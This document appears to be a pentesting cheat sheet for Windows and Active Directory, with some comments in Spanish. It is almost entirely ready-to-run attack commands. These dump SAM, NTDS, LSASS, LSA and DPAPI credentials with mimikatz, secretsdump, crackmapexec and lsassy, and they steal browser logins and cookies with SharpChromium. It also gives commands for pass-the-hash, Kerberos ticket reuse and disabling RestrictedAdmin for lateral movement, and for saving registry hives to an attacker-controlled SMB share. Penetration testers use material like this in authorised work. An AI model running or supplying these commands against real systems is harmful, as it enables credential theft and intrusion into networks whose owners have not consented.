# DUMP

## Dump Credentials/Hashes

### SAM

#### Local

```bash
#Windows
reg save HKLM\SAM c:\sam.save
reg save HKLM\SYSTEM c:\system.save
.\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit" > sam_output.txt

#Linux
secretsdump -sam sam.save -system system.save LOCAL

#o desde Linux
smbserver.py -smb2support share .
reg.py domain.com/username:'Password'@ip save -keyName 'HKLM\SAM' -o '\\192.168.56.1\share'
reg.py domain.com/username:'Password'@ip save -keyName 'HKLM\SYSTEM' -o '\\192.168.56.1\share'
```

```bash
impacket-secretsdump domain.com/username:'Password'@ip
crackmapexec smb $ip -u 'user' -p 'pass' --sam 
hashdump #metasploit
mimikatz.exe "privilege::debug" "lsadump::sam" "exit"
```

### NTDS

```bash
impacket-secretsdump domain.com/username:'Password'@ip
crackmapexec smb $ip -u 'user' -p 'pass' --ntds #drsuapi default (replicacion)
crackmapexec smb $ip -u 'user' -p 'pass' --ntds vss #copia de seguridad
crackmapexec smb $ip -u 'user' -p 'pass' --ntds-history #hashes anteriores
```

### LSASS

> A classic example could be to launch bloudhound.py with the computer account

[lsassy](https://github.com/Hackndo/lsassy)
[Dumpert DLL](https://github.com/outflanknl/Dumpert)

```bash
#Windows
reg save HKLM\SECURITY c:\security.save
reg save HKLM\SYSTEM c:\system.save

#Linux
secretsdump -sam security.save -system system.save LOCAL

#o desde Linux
smbserver.py -smb2support share .
reg.py domain.com/username:'Password'@ip save -keyName 'HKLM\SECURITY' -o '\\192.168.56.1\share'
reg.py domain.com/username:'Password'@ip save -keyName 'HKLM\SYSTEM' -o '\\192.168.56.1\share'
```

```bash
impacket-secretsdump domain.com/username:'Password'@ip
crackmapexec smb $ip -u 'user' -p 'pass' --sam 
mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "exit"
hashdump #metasploit
#install lsassy
python3 -m pip install lsassy
./lsassy -d domain.com -u username -p 'Password' $ip -m dumpertdll -O dumpertdll_path=/path/to/Outflank-Dumpert-DLL.dll
crackmapexec smb $ip -k -M lsassy -o BLOODHOUND=True NEO4JUSER=neo4j NEO4JPASS=Somepassw0rd #add owned to bloodhound
```

### LSA

```bash
crackmapexec smb $ip -u 'user' -p 'pass' --lsa
impacket-secretsdump domain.com/username:'Password'@ip

```

### DPAPI

```bash
impacket-secretsdump domain.com/username:'Password'@ip
mimikatz.exe "sekurlsa::dpapi"
```

### Stored Passwords

```bash
lazagne.exe all
findstr /si 'password' *.txt *.xml *.docx *.csv *.xlsx
crackmapexec smb $ip -u user -p pass -M impersonate
```

### SharpChromium

```powershell
.\SharpChromium.exe all
.\SharpChromium.exe logins
.\SharpChromium.exe cookies domain.com
```

### MSOL Account

```bash
# AAD Connect Server
crackmapexec smb -u user -p pass -M msol
```


# Lateral Move

## Credentials (SMB, RDP, WINRM, MSSQL)

### Installation NXC

> CrackMapExec can generate false negatives, so it's better to configure NXC

```bash
apt install python3 python3-pip
git clone https://github.com/Pennyw0rth/NetExec
cd NetExec
python3 -m venv .
source bin/activate
pip install .
NetExec
```

```bash
NetExec smb smb.txt -u 'user' -p 'pass' -d domain.com
NetExec rdp rdp.txt -u 'user' -p 'pass' -d domain.com
NetExec winrm winrm.txt -u 'user' -p 'pass' -d domain.com
NetExec mssql mssql.txt -u 'user' -p 'pass' -d domain.com
```



## Reuse passwords 

```bash
crackmapexec smb $ip -u 'Administrator' -p 'pass' --local-Auth -x whoami
python3 psexec.py domain.com/username:'Password1'@$ip # or -hashes <hash> or -k -no-pass kerberos authentication
python3 wmiexec.py domain.com/username:'Password1'@$ip
python3 smbexec.py domain.com/username:'Password1'@$ip
python3 atexec.py domain.com/username:'Password1'@$ip command
python3 dcomexec.py domain.com/username:'Password1'@$ip #only disabled firewall
evil-winrm -i $ip -u user -p password # or -H <hash>
```

### TGT

```bash
getTGT.py -hashes ':cba36eccfd9d949c73bc73715364aff5' domain.com/username
export KRB5CCNAME=/path/to/username.ccache
python3 wmiexec.py -k -no-pass domain.com/username@ip
evil-winrm -i pc.domain.com -r domain.com
#Also converto .kirbi to tickets
ticketConverter.py kirbi_ticket.kirbi ccache_ticket.ccache
```


## RDP

```bash
xfreerdp /d:domain.com /u:username /p:password /v:<ip or domain> /cert-ignore
#Pass-the-hash
xfreerdp /u:username /d:domain.com /pth:hash /v:<ip or domain> #pth
```

### Impersonate RDP Session

```cmd
psexec -s -i cmd
query user
cmd /k tscon <id> /dest:console
```

### Pass the Hash enabled

```powershell
New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin -Value 0
```

```bash
reg.py domain.com/username@$ip -hashes "hash" query -keyName 'HKLM\System\CurrentControlSet\Control\Lsa'
reg.py domain.com/username@$ip -hashes "hash" query -keyName add -keyName 'HKLM\System\CurrentControlSet\Control\Lsa' -v 'DisableRestrictedAdmin' -vt 'REG_DWORD' -vd '0' #if not exists
reg.py domain.com/username@$ip -hashes "hash" delete -keyName 'HKLM\System\CurrentControlSet\Control\Lsa' -v 'DisableRestrictedAdmin' #and delete 
```

## Certificate

```bash
certipy certipy req -u username@domain.com -p 'pass' -target pc.domain.com -template templateName -ca CANAME -upn username@domain.com
certipy auth -pfx username.pfx -dc-ip $ip #and obtain hash
```

## Search password SMB

> https://github.com/blacklanternsecurity/MANSPIDER

```bash
manspider.py --threads 50 $IP_RANGE/$MASK -d $DOMAIN -u $USER -p $PASSWORD --content "set sqlplus" "password ="
```